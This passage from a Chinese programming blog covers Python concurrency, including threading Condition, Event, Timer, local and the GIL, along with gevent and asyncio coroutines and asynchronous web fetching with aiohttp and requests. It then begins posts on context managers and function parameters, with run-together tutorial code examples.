调用这个方法将从等待池挑选一个线程并通知，收到通知的线程将自动调用acquire()尝试获得锁定（进入锁定池）；其他线程仍然在等待池中。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。 notifyAll(): 调用这个方法将通知等待池中所有的线程，这些线程都将进入锁定池尝试获得锁定。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。 例子1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8# encoding: UTF-8import threadingimport time# 商品product = None# 条件变量con = threading.Condition()# 生产者方法def produce(): global product if con.acquire(): while True: if product is None: print 'produce...' product = 'anything' # 通知消费者，商品已经生产 con.notify() # 等待通知 con.wait() time.sleep(2)# 消费者方法def consume(): global product if con.acquire(): while True: if product is not None: print 'consume...' product = None # 通知生产者，商品已经没了 con.notify() # 等待通知 con.wait() time.sleep(2)t1 = threading.Thread(target=produce)t2 = threading.Thread(target=consume)t2.start()t1.start()output:produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...consume...produce...程序不断循环运行下去。重复生产消费过程。 例子2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding:utf-8import threadingimport timecondition = threading.Condition()products = 0class Producer(threading.Thread): def run(self): global products while True: if condition.acquire(): if products &lt; 10: products += 1; print \"Producer(%s):deliver one, now products:%s\" %(self.name, products) condition.notify()#不释放锁定，因此需要下面一句 condition.release() else: print \"Producer(%s):already 10, stop deliver, now products:%s\" %(self.name, products) condition.wait();#自动释放锁定 time.sleep(2)class Consumer(threading.Thread): def run(self): global products while True: if condition.acquire(): if products &gt; 1: products -= 1 print \"Consumer(%s):consume one, now products:%s\" %(self.name, products) condition.notify() condition.release() else: print \"Consumer(%s):only 1, stop consume, products:%s\" %(self.name, products) condition.wait(); time.sleep(2)if __name__ == \"__main__\": for p in range(0, 2): p = Producer() p.start() for c in range(0, 3): c = Consumer() c.start() 0x2.5Event类 Event（事件）是最简单的线程通信机制之一：一个线程通知事件，其他线程等待事件。Event内置了一个初始为False的标志，当调用set()时设为True，调用clear()时重置为 False。wait()将阻塞线程至等待阻塞状态。 Event其实就是一个简化版的 Condition。Event没有锁，无法使线程进入同步阻塞状态。 构造方法：Event() 实例方法： isSet(): 当内置标志为True时返回True。 set(): 将标志设为True，并通知所有处于等待阻塞状态的线程恢复运行状态。 clear(): 将标志设为False。 wait([timeout]): 如果标志为True将立即返回，否则阻塞线程至等待阻塞状态，等待其他线程调用set()。 例子1 123456789101112131415161718192021# encoding: UTF-8import threadingimport timeevent = threading.Event()def func(): # 等待事件，进入等待阻塞状态 print '%s wait for event...' % threading.currentThread().getName() event.wait() # 收到事件后进入运行状态 print '%s recv event.' % threading.currentThread().getName()t1 = threading.Thread(target=func)t2 = threading.Thread(target=func)t1.start()t2.start()time.sleep(2)# 发送事件通知print 'MainThread set event.'event.set() 0x2.6 timer类Timer（定时器）是Thread的派生类，用于在指定时间后调用一个方法。构造方法：Timer(interval, function, args=[], kwargs={}) interval: 指定的时间 function: 要执行的方法 args/kwargs: 方法的参数 实例方法：Timer从Thread派生，没有增加实例方法。 1234567# encoding: UTF-8import threadingdef func(): print 'hello timer!'timer = threading.Timer(5, func)timer.start()线程延迟5秒后执行。 0x2.7local类local是一个小写字母开头的类，用于管理 thread-local（线程局部的）数据。对于同一个local，线程无法访问其他线程设置的属性；线程设置的属性不会被其他线程设置的同名属性替换。 可以把local看成是一个“线程-属性字典”的字典，local封装了从自身使用线程作为 key检索对应的属性字典、再使用属性名作为key检索属性值的细节。 1234567891011121314151617# encoding: UTF-8import threadinglocal = threading.local()local.tname = 'main'def func(): local.tname = 'notmain' print local.tnamet1 = threading.Thread(target=func)t1.start()t1.join()print local.tname output:notmainmain[Finished in 0.2s] 具体可看 http://funhacks.net/explore-python/Process-Thread-Coroutine/threadlocal.html 0x2.8GIL 锁Python 的线程虽然是真正的线程，但解释器执行代码时，有一个 GIL 锁(Global Interpreter Lock)，任何 Python 线程执行前，必须先获得 GIL 锁。每执行 100 条字节码，解释器就自动释放 GIL 锁，让别的线程有机会执行。这个 GIL 全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在 Python 中只能交替执行，即使 100 个线程跑在 100 核 CPU 上，也只能用到 1 个核。 GIL 是 Python 解释器设计的历史遗留问题，通常我们用的解释器是官方实现的 CPython，要真正利用多核，除非重写一个不带 GIL 的解释器。所以，在 Python 如果一定要通过多线程利用多核，那只能通过 C 扩展来实现。 因而，多线程的并发在 Python 中就是一个美丽的梦，如果想真正实现多核任务，还是通过多进程来实现吧。 0x3 协程具体可看此篇文章:https://thief.one/2017/02/20/Python%E5%8D%8F%E7%A8%8B/ 0x3.1协程的理解概念 协程，又称微线程，纤程，英文名Coroutine。协程的作用，是在执行函数A时，可以随时中断，去执行函数B，然后中断继续执行函数A（可以自由切换）。但这一过程并不是函数调用（没有调用语句），这一整个过程看似像多线程，然而协程只有一个线程执行。 优势 执行效率极高，因为子程序切换（函数）不是线程切换，由程序自身控制，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。 不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。 说明：协程可以处理IO密集型程序的效率问题，但是处理CPU密集型不是它的长处，如要充分发挥CPU利用率可以结合多进程+协程。 0x3.2Python2.x协程python2.x协程应用： yield gevent 0x3.2.1 Geventgevent是第三方库，通过greenlet实现协程，其基本思想：当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。 Gevent使用说明 monkey可以使一些阻塞的模块变得不阻塞，机制：遇到IO操作则自动切换，手动切换可以用gevent.sleep(0)（将爬虫代码换成这个，效果一样可以达到切换上下文） gevent.spawn() 方法会创建一个新的greenlet协程对象，并运行它。 gevent.joinall() 方法会等待所有传入的greenlet协程运行结束后再退出，这个方法可以接受一个”timeout”参数来设置超时时间，单位是秒。 12345678910111213141516171819#! -*- coding:utf-8 -*-import geventfrom gevent import monkey;monkey.patch_all()import urllib2def get_body(i): print \"start\",i urllib2.urlopen(\"http://cn.bing.com\") print \"end\",itasks=[gevent.spawn(get_body,i) for i in range(3)]gevent.joinall(tasks)output:start 0start 1start 2end 0end 2end 1[Finished in 11.7s] 说明：从结果上来看，执行get_body的顺序应该先是输出”start”，然后执行到urllib2时碰到IO堵塞，则会自动切换运行下一个程序（继续执行get_body输出start），直到urllib2返回结果，再执行end。也就是说，程序没有等待urllib2请求网站返回结果，而是直接先跳过了，等待执行完毕再回来获取返回值。值得一提的是，在此过程中，只有一个线程在执行，因此这与多线程的概念是不一样的。换成多线程的代码看看: 12345678910111213141516171819#! -*- coding:utf-8 -*-import threadingimport urllib2def get_body(i): print \"start\",i urllib2.urlopen(\"http://cn.bing.com\") print \"end\",ifor i in range(3): t=threading.Thread(target=get_body,args=(i,)) t.start()output:start 0start 1start 2end 2end 0end 1[Finished in 11.7s] 说明：从结果来看，多线程与协程的效果一样，都是达到了IO阻塞时切换的功能。不同的是，多线程切换的是线程（线程间切换），协程切换的是上下文（可以理解为执行的函数）。而切换线程的开销明显是要大于切换上下文的开销，因此当线程越多，协程的效率就越比多线程的高。（猜想多进程的切换开销应该是最大的） 0x3.3Python3.x协程详情可看此篇;https://thief.one/2018/06/21/1/ 0x3.3.1协程函数（异步函数）0x3.3.1.1创建协程函数先来看下普通函数： 12345678910def test1(): print(\"1\") print(\"2\")def test2(): print(\"3\") print(\"4\")a = test1()b = test2()print(a,type(a))print(b,type(b)) 运行以上代码得到结果： 1234561234None &lt;class 'NoneType'&gt;None &lt;class 'NoneType'&gt; 说明：程序顺序执行了test1、test2函数，在调用函数的时候就自动进入了函数体，并执行了函数的内容。 然后使用async关键词将普通函数变成协程函数，即异步函数： 12345678async def test1(): print(\"1\") print(\"2\")async def test2(): print(\"3\") print(\"4\")print(test1())print(test2()) 运行以上代码得到结果： 123456&lt;coroutine object test1 at 0x109f4c620&gt;asyncio_python3_test.py:16: RuntimeWarning: coroutine 'test1' was never awaited print(test1())&lt;coroutine object test2 at 0x109f4c620&gt;asyncio_python3_test.py:17: RuntimeWarning: coroutine 'test2' was never awaited print(test2()) 说明：忽略结果中的告警，可以看到调用函数test1、test2的时候，并没有进入函数体且执行函数内容，而是返回了一个coroutine（协程对象）。 除了函数外，类的方法也可以使用async关键词将其变成协程方法： 123class test: async def run(self): print(\"1\") 0x3.3.1.2执行协程函数 前面我们成功创建了协程函数，并且在调用函数的时候返回了一个协程对象，那么怎么进入函数体并执行函数内容呢？类似于生成器，可以使用send方法执行函数，修改下前面的代码： 12345678910async def test1(): print(\"1\") print(\"2\")async def test2(): print(\"3\") print(\"4\")a = test1()b = test2()a.send(None)b.send(None) 运行以上代码得到以下结果： 123456712Traceback (most recent call last): File \"asyncio_python3_test.py\", line 19, in &lt;module&gt; a.send(None)StopIterationsys:1: RuntimeWarning: coroutine 'test2' was never awaited 说明：程序先执行了test1协程函数，当test1执行完时报了StopIteration异常，这是协程函数执行完饭回的一个异常，我们可以用try except捕捉，来用判断协程函数是否执行完毕。 1234567891011121314151617181920async def test1(): print(\"1\") print(\"2\")async def test2(): print(\"3\") print(\"4\")a = test1()b = test2()try: a.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration as e: print(e.value) # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束，返回值在value中 passtry: b.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: print(e.value) # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束，返回值在value中 pass 运行以上代码得到以下结果： 12341234 说明：程序先执行了test1函数，等到test1函数执行完后再执行test2函数。从执行过程上来看目前协程函数与普通函数没有区别，并没有实现异步函数，那么如何交叉运行协程函数呢？ 0x3.3.1.3交叉执行协程函数（await） 通过以上例子，我们发现定义协程函数可以使用async关键词，执行函数可以使用send方法，那么如何实现在两个协程函数间来回切换执行呢？这里需要使用await关键词，修改一下代码： 12345678910111213141516171819import asyncioasync def test1(): print(\"1\") await asyncio.sleep(1) # asyncio.sleep(1)返回的也是一个协程对象 print(\"2\")async def test2(): print(\"3\") print(\"4\")a = test1()b = test2()try: a.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: # 协程函数执行结束时会抛出一个StopIteration 异常，标志着协程函数执行结束 passtry: b.send(None) # 可以通过调用 send 方法，执行协程函数except StopIteration: pass 运行以上函数得到以下结果： 123134 说明：程序先执行test1协程函数，在执行到await时，test1函数停止了执行（阻塞）；接着开始执行test2协程函数，直到test2执行完毕。从结果中，我们可以看到，直到程序运行完毕，test1函数也没有执行完（没有执行print(“2”)），那么如何使test1函数执行完毕呢？可以使用asyncio自带的方法循环执行协程函数。 0x3.3.1.4 await与阻塞 使用async可以定义协程对象，使用await可以针对耗时的操作进行挂起，就像生成器里的yield一样，函数让出控制权。协程遇到await，事件循环将会挂起该协程，执行别的协程，直到其他的协程也挂起或者执行完毕，再进行下一个协程的执行，协程的目的也是让一些耗时的操作异步化。 注意点：await后面跟的必须是一个Awaitable对象，或者实现了相应协议的对象，查看Awaitable抽象类的代码，表明了只要一个类实现了await方法，那么通过它构造出来的实例就是一个Awaitable，并且Coroutine类也继承了Awaitable。 0x3.3.1.5自动循环执行协程函数 通过前面介绍我们知道执行协程函数需要使用send方法，但一旦协程函数执行过程中切换到其他函数了，那么这个函数就不在被继续运行了，并且使用sned方法不是很高效。那么如何在执行整个程序过程中，自动得执行所有的协程函数呢，就如同多线程、多进程那样，隐式得执行而不是显示的通过send方法去执行函数。 0x3.3.1.5.1事件循环方法前面提到的问题就需要用到事件循环方法去解决，即asyncio.get_event_loop方法，修改以上代码如下： 12345678910import asyncioasync def test1(): print(\"1\") await test2() print(\"2\")async def test2(): print(\"3\") print(\"4\")loop = asyncio.get_event_loop()loop.run_until_complete(test1()) 运行以上代码得到以下结果： 12341342 说明：asyncio.get_event_loop方法可以创建一个事件循环，然后使用run_until_complete将协程注册到事件循环，并启动事件循环。 0x3.3.1.5.2task任务 由于协程对象不能直接运行，在注册事件循环的时候，其实是run_until_complete方法将协程包装成为了一个任务（task）对象。所谓task对象是Future类的子类，保存了协程运行后的状态，用于未来获取协程的结果。我们也可以手动将协程对象定义成task，修改以上代码如下： 1234567891011import asyncioasync def test1(): print(\"1\") await test2() print(\"2\")async def test2(): print(\"3\") print(\"4\")loop = asyncio.get_event_loop()task = loop.create_task(test1())loop.run_until_complete(task) 说明：前面说到task对象保存了协程运行的状态，并且可以获取协程函数运行的返回值，那么具体该如何获取呢？这里可以分两种方式，一种需要绑定回调函数，另外一种则直接在运行完task任务后输出。值得一提的是，如果使用send方法执行函数，则返回值可以通过捕捉StopIteration异常，利用StopIteration.value获取。 0x3.3.1.5.3直接输出task结果当协程函数运行结束后，我们需要得到其返回值，第一种方式就是等到task状态为finish时，调用task的result方法获取返回值。 12345678910111213import asyncioasync def test1(): print(\"1\") await test2() print(\"2\") return \"stop\"async def test2(): print(\"3\") print(\"4\")loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())loop.run_until_complete(task)print(task.result()) 运行以上代码得到以下结果： 123451342stop 0x3.3.1.5.4回调函数 获取返回值的第二种方法是可以通过绑定回调函数，在task执行完毕的时候可以获取执行的结果，回调的最后一个参数是future对象，通过该对象可以获取协程返回值。 123456789101112131415import asyncioasync def test1(): print(\"1\") await test2() print(\"2\") return \"stop\"async def test2(): print(\"3\") print(\"4\")def callback(future): print('Callback:',future.result()) # 通过future对象的result方法可以获取协程函数的返回值loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1()) # 创建task，test1()是一个协程对象task.add_done_callback(callback) # 绑定回调函数loop.run_until_complete(task) 运行以上代码得到以下结果： 123451342Callback: stop 如果回调函数需要接受多个参数，可以通过偏函数导入，修改代码如下： 1234567891011121314151617import asyncioimport functoolsasync def test1(): print(\"1\") await test2() print(\"2\") return \"stop\"async def test2(): print(\"3\") print(\"4\")def callback(param1,param2,future): print(param1,param2) print('Callback:',future.result())loop = asyncio.get_event_loop()task = asyncio.ensure_future(test1())task.add_done_callback(functools.partial(callback,\"param1\",\"param2\"))loop.run_until_complete(task) 说明：回调函数中的future对象就是创建的task对象。 0x3.3.1.5.5future对象 future对象有几个状态：Pending、Running、Done、Cancelled。创建future的时候，task为pending，事件循环调用执行的时候当然就是running，调用完毕自然就是done，如果需要停止事件循环，就需要先把task取消，可以使用asyncio.Task获取事件循环的task。 0x3.3.1.5.6协程停止 前面介绍了使用事件循环执行协程函数，那么怎么停止执行呢？在停止执行协程前，需要先取消task，然后再停止loop事件循环。 123456789101112131415161718192021import asyncioasync def test1(): print(\"1\") await asyncio.sleep(3) print(\"2\") return \"stop\"tasks = [ asyncio.ensure_future(test1()), asyncio.ensure_future(test1()), asyncio.ensure_future(test1()),]loop = asyncio.get_event_loop()try: loop.run_until_complete(asyncio.wait(tasks))except KeyboardInterrupt as e: for task in asyncio.Task.all_tasks(): task.cancel() loop.stop() loop.run_forever()finally: loop.close() 运行以上代码，按ctrl+c可以结束执行。 0x3.3.2本文中用到的一些概念及方法event_loop事件循环：程序开启一个无限的循环，当把一些函数注册到事件循环上时，满足事件发生条件即调用相应的函数。 coroutine协程对象：指一个使用async关键字定义的函数，它的调用不会立即执行函数，而是会返回一个协程对象，协程对象需要注册到事件循环，由事件循环调用。 task任务：一个协程对象就是一个原生可以挂起的函数，任务则是对协程进一步封装，其中包含任务的各种状态。 future：代表将来执行或没有执行的任务的结果，它和task上没有本质的区别 async/await关键字：python3.5用于定义协程的关键字，async定义一个协程，await用于挂起阻塞的异步调用接口。 0x3.3.3并发与并行 并发通常指有多个任务需要同时进行，并行则是同一时刻有多个任务执行。用多线程、多进程、协程来说，协程实现并发，多线程与多进程实现并行。 0x3.3.3.1asyncio协程如何实现并发 asyncio想要实现并发，就需要多个协程来完成任务，每当有任务阻塞的时候就await，然后其他协程继续工作，这需要创建多个协程的列表，然后将这些协程注册到事件循环中。这里指的多个协程，可以是多个协程函数，也可以是一个协程函数的多个协程对象。 123456789101112131415161718import asyncioasync def test1(): print(\"1\") await asyncio.sleep(1) print(\"2\") return \"stop\"a = test1()b = test1()c = test1()tasks = [ asyncio.ensure_future(a), asyncio.ensure_future(b), asyncio.ensure_future(c),]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) # 注意asyncio.wait方法for task in tasks: print(\"task result is \",task.result()) 运行以上代码得到以下结果： 123456789111222task result is stoptask result is stoptask result is stop 说明：代码先是定义了三个协程对象，然后通过asyncio.ensure_future方法创建了三个task，并且将所有的task加入到了task列表，最终使用loop.run_until_complete将task列表添加到事件循环中。 0x3.3.4协程爬虫 前面介绍了如何使用async与await创建协程函数，使用asyncio.get_event_loop创建事件循环并执行协程函数。例子很好地展示了协程并发的高效，但在实际应用场景中该如何开发协程程序？比如说异步爬虫。我尝试用requests模块、urllib模块写异步爬虫，但实际操作发现并不支持asyncio异步，因此可以使用aiohttp模块编写异步爬虫。 0x3.3.4.1aiohttp实现1234567891011import asyncioimport aiohttpasync def run(url): print(\"start spider \",url) async with aiohttp.ClientSession() as session: async with session.get(url) as resp: print(resp.url)url_list = [\"https://thief.one\",\"https://home.nmask.cn\",\"https://movie.nmask.cn\",\"https://tool.nmask.cn\"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 运行以上代码得到以下结果： 12345678start spider https://thief.onestart spider https://home.nmask.cnstart spider https://movie.nmask.cnstart spider https://tool.nmask.cnhttps://movie.nmask.cnhttps://home.nmask.cnhttps://tool.nmask.cnhttps://thief.one 说明：aiohttp基于asyncio实现，既可以用来写webserver，也可以当爬虫使用。 0x3.3.4.2requests实现 由于requests模块阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结，但如果一定要用requests模块，可以使用事件循环对象的run_in_executor方法，通过run_in_executor方法来新建一个线程来执行耗时函数，因此可以这样修改代码实现： 123456789101112import asyncioimport requestsasync def run(url): print(\"start \",url) loop = asyncio.get_event_loop() response = await loop.run_in_executor(None, requests.get, url) print(response.url) url_list = [\"https://thief.one\",\"https://home.nmask.cn\",\"https://movie.nmask.cn\",\"https://tool.nmask.cn\"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 如果要给requests带上参数，可以使用functools： 12345678910111213141516import asyncioimport requestsimport functoolsasync def run(url): print(\"start \",url) loop = asyncio.get_event_loop() try: response = await loop.run_in_executor(None,functools.partial(requests.get,url=url,params=\"\",timeout=1)) except Exception as e: print(e) else: print(response.url)url_list = [\"https://thief.one\",\"https://home.nmask.cn\",\"https://movie.nmask.cn\",\"https://tool.nmask.cn\"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 0x3.3.5asyncio中使用阻塞函数 如同前面介绍如何在asyncio中使用requests模块一样，如果想在asyncio中使用其他阻塞函数，该怎么实现呢？虽然目前有异步函数支持asyncio，但实际问题是大部分IO模块还不支持asyncio。 阻塞函数在asyncio中使用的问题 阻塞函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。 解决方案 这个问题的解决方法是使用事件循环对象的run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行，即可以通过run_in_executor方法来新建一个线程来执行耗时函数。 run_in_executor方法 1AbstractEventLoop.run_in_executor(executor, func, *args) executor 参数应该是一个 Executor 实例。如果为 None，则使用默认 executor。 func 就是要执行的函数 args 就是传递给 func 的参数实际例子（使用time.sleep()）： 1234567891011121314import asyncioimport timeasync def run(url): print(\"start \",url) loop = asyncio.get_event_loop() try: await loop.run_in_executor(None,time.sleep,1) except Exception as e: print(e) print(\"stop \",url)url_list = [\"https://thief.one\",\"https://home.nmask.cn\",\"https://movie.nmask.cn\",\"https://tool.nmask.cn\"]tasks = [asyncio.ensure_future(run(url)) for url in url_list]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 运行以上代码得到以下函数： 12345678start https://thief.onestart https://home.nmask.cnstart https://movie.nmask.cnstart https://tool.nmask.cnstop https://thief.onestop https://movie.nmask.cnstop https://home.nmask.cnstop https://tool.nmask.cn 说明：有了run_in_executor方法，我们就可以使用之前熟悉的模块创建协程并发了，而不需要使用特定的模块进行IO异步开发。 参考文章:进程线程协程:http://funhacks.net/explore-python/Process-Thread-Coroutine/process.htmlPython之路：(十五）进程、线程和协程:http://www.liangxiansen.cn/2016/08/08/python-thread-process-gevent/Python中多进程之间的数据共享:https://docs.lvrui.io/2016/07/24/Python%E4%B8%AD%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%85%B1%E4%BA%AB/多线程总结:https://www.cnblogs.com/tkqasn/p/5700281.html Python协程：https://thief.one/2017/02/20/Python%E5%8D%8F%E7%A8%8B/Python3.5协程学习研究:https://thief.one/2018/06/21/1/","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"线程","slug":"线程","permalink":"https://blog.cfyqy.com/tags/%E7%BA%BF%E7%A8%8B/"},{"name":"进程","slug":"进程","permalink":"https://blog.cfyqy.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"协程","slug":"协程","permalink":"https://blog.cfyqy.com/tags/%E5%8D%8F%E7%A8%8B/"}],"author":"ye1s"},{"title":"python的上下文管理器","slug":"python的上下文管理器","date":"2019-06-01T16:05:00.000Z","updated":"2020-04-13T08:17:32.791Z","comments":true,"path":"article/c616b095.html","link":"","permalink":"https://blog.cfyqy.com/article/c616b095.html","excerpt":"转载此文件:http://funhacks.net/explore-python/Advanced-Features/context.html","text":"转载此文件:http://funhacks.net/explore-python/Advanced-Features/context.html 什么是上下文？其实我们可以简单地把它理解成环境。从一篇文章中抽出一句话，让你来理解，我们会说这是断章取义。为什么？因为我们压根就没考虑到这句话的上下文是什么。编程中的上下文也与此类似，比如『进程上下文』，指的是一个进程在执行的时候，CPU 的所有寄存器中的值、进程的状态以及堆栈上的内容等，当系统需要切换到其他进程时，系统会保留当前进程的上下文，也就是运行时的环境，以便再次执行该进程。 迭代器有迭代器协议（Iterator Protocol），上下文管理器（Context manager）也有上下文管理协议（Context Management Protocol）。 上下文管理器协议，是指要实现对象的 enter() 和 exit() 方法。 上下文管理器也就是支持上下文管理器协议的对象，也就是实现了 __enter__() 和 __exit__() 方法。 0x1上下文管理器理解这里先构造一个简单的上下文管理器的例子，以理解 __enter__() 和 __exit__() 方法。 1234567891011121314151617from math import sqrt, powclass Point(object): def __init__(self, x, y): print 'initialize x and y' self.x, self.y = x, y def __enter__(self): print \"Entering context\" return self def __exit__(self, type, value, traceback): print \"Exiting context\" def get_distance(self): distance = sqrt(pow(self.x, 2) + pow(self.y, 2)) return distance 上面的代码定义了一个 Point 类，并实现了 enter() 和 exit() 方法，我们还定义了 get_distance 方法，用于返回点到原点的距离。 通常，我们使用 with 语句调用上下文管理器： 12345678with Point(3, 4) as pt: print 'distance: ', pt.get_distance()# outputinitialize x and y # 调用了 __init__ 方法Entering context # 调用了 __enter__ 方法distance: 5.0 # 调用了 get_distance 方法Exiting context # 调用了 __exit__ 方法 上面的 with 语句执行过程如下： Point(3, 4) 生成了一个上下文管理器； 调用上下文管理器的 __enter__() 方法，并将 __enter__() 方法的返回值赋给 as 字句中的变量 pt; 执行语句体（指 with 语句包裹起来的代码块）内容，输出 distance； 不管执行过程中是否发生异常，都执行上下文管理器的__exit__() 方法。__exit__() 方法负责执行『清理』工作，如释放资源，关闭文件等。如果执行过程没有出现异常，或者语句体中执行了语句 break/continue/return，则以 None 作为参数调用__exit__(None, None, None)；如果执行过程中出现异常，则使用 sys.exc_info 得到的异常信息为参数调用 __exit__(exc_type, exc_value, exc_traceback)； 出现异常时，如果 __exit__(type, value, traceback) 返回 False 或 None，则会重新抛出异常，让 with 之外的语句逻辑来处理异常；如果返回 True，则忽略异常，不再对异常进行处理； 上面的 with 语句执行过程没有出现异常，我们再来看出现异常的情形： 1234567891011121314with Point(3, 4) as pt: pt.get_length() # 访问了对象不存在的方法# outputinitialize x and yEntering contextExiting context---------------------------------------------------------------------------AttributeError Traceback (most recent call last)&lt;ipython-input-216-ab4a0e6b6b4a&gt; in &lt;module&gt;() 1 with Point(3, 4) as pt:----&gt; 2 pt.get_length()AttributeError: 'Point' object has no attribute 'get_length' 在我们的例子中，__exit__ 方法返回的是 None（如果没有 return 语句那么方法会返回 None）。因此，with 语句抛出了那个异常。我们对__exit__ 方法做一些改动，让它返回 True。 12345678910111213141516171819202122232425262728from math import sqrt, powclass Point(object): def __init__(self, x, y): print 'initialize x and y' self.x, self.y = x, y def __enter__(self): print \"Entering context\" return self def __exit__(self, type, value, traceback): print \"Exception has been handled\" print \"Exiting context\" return True def get_distance(self): distance = sqrt(pow(self.x, 2) + pow(self.y,2 )) return distancewith Point(3, 4) as pt: pt.get_length() # 访问了对象不存在的方法# outputinitialize x and yEntering contextException has been handledExiting context 可以看到，由于 __exit__方法返回了 True，因此没有异常会被 with 语句抛出。 0x2内建对象使用with 语句除了自定义上下文管理器，Python 中也提供了一些内置对象，可直接用于 with 语句中，比如最常见的文件操作。 传统的文件操作经常使用 try/finally 的方式，比如： 123456file = open('somefile', 'r')try: for line in file: print linefinally: file.close() # 确保关闭文件 将上面的代码改用 with 语句： 123with open('somefile', 'r') as file: for line in file: print line 可以看到，通过使用 with，代码变得很简洁，而且即使处理过程发生异常，with 语句也会确保我们的文件被关闭。 0x3contextlib 模块除了在类中定义 __enter__ 和 __exit__ 方法来实现上下文管理器，我们还可以通过生成器函数（也就是带有 yield 的函数）结合装饰器来实现上下文管理器，Python 中自带的 contextlib 模块就是做这个的。 contextlib 模块提供了三个对象：装饰器 contextmanager、函数 nested 和上下文管理器 closing。其中，contextmanager 是一个装饰器，用于装饰生成器函数，并返回一个上下文管理器。需要注意的是，被装饰的生成器函数只能产生一个值，否则会产生 RuntimeError 异常。 下面我们看一个简单的例子： 123456789101112131415from contextlib import contextmanager@contextmanagerdef point(x, y): print 'before yield' yield x * x + y * y print 'after yield'with point(3, 4) as value: print 'value is: %s' % value# outputbefore yieldvalue is: 25after yield 可以看到，yield 产生的值赋给了 as 子句中的 value 变量。 另外，需要强调的是，虽然通过使用 contextmanager 装饰器，我们可以不必再编写 __enter__ 和 __exit__ 方法，但是『获取』和『清理』资源的操作仍需要我们自己编写：『获取』资源的操作定义在 yield 语句之前，『释放』资源的操作定义在 yield 语句之后。 小结 上下文管理器是支持上下文管理协议的对象，也就是实现了__enter__和 __exit__ 方法。 通常，我们使用 with 语句调用上下文管理器。with 语句尤其适用于对资源进行访问的场景，确保执行过程中出现异常情况时也可以对资源进行回收，比如自动关闭文件等。 __enter__ 方法在 with 语句体执行前调用，with 语句将该方法的返回值赋给 as 字句中的变量，如果有 as 字句的话。 __exit__ 方法在退出运行时上下文时被调用，它负责执行『清理』工作，比如关闭文件，释放资源等。如果退出时没有发生异常，则 __exit__ 的三个参数，即 type, value 和 traceback 都为 None。如果发生异常，返回 True 表示不处理异常，否则会在退出该方法后重新抛出异常以由 with 语句之外的代码逻辑进行处理。","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"上下文管理器","slug":"上下文管理器","permalink":"https://blog.cfyqy.com/tags/%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E5%99%A8/"}],"author":"ye1s"},{"title":"python的函数编程","slug":"python的函数编程","date":"2019-06-01T12:04:00.000Z","updated":"2020-04-13T08:17:43.336Z","comments":true,"path":"article/5e2ba329.html","link":"","permalink":"https://blog.cfyqy.com/article/5e2ba329.html","excerpt":"函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。","text":"函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。 详情可看此wiki: http://funhacks.net/explore-python/Function/ 0x1函数基础0x1.1定义函数在 Python 中，定义函数使用 def 语句。一个函数主要由三部分构成： 函数名 函数参数 函数返回值 如果函数没有 return 语句，则自动 return None可以定义返回多个值的函数 1234def add_one(x, y, z): return x+1, y+1, z+1print(add_one(1,2,3)) 0x1.2函数参数在 Python 中，定义函数和调用函数都很简单，但如何定义函数参数和传递函数参数，则涉及到一些套路了。总的来说，Python 的函数参数主要分为以下几种： 必选参数 默认参数 可变参数 关键字参数 0x1.2.1必选参数必选参数可以说是最常见的了，顾名思义，必选参数就是在调用函数的时候要传入数量一致的参数，比如： 12345678910111213141516171819202122232425&gt;&gt;&gt; def add(x, y): # x, y 是必选参数... print x + y...&gt;&gt;&gt; add() # 啥都没传，不行Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: add() takes exactly 2 arguments (0 given)&gt;&gt;&gt; add(1) # 只传了一个，也不行Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: add() 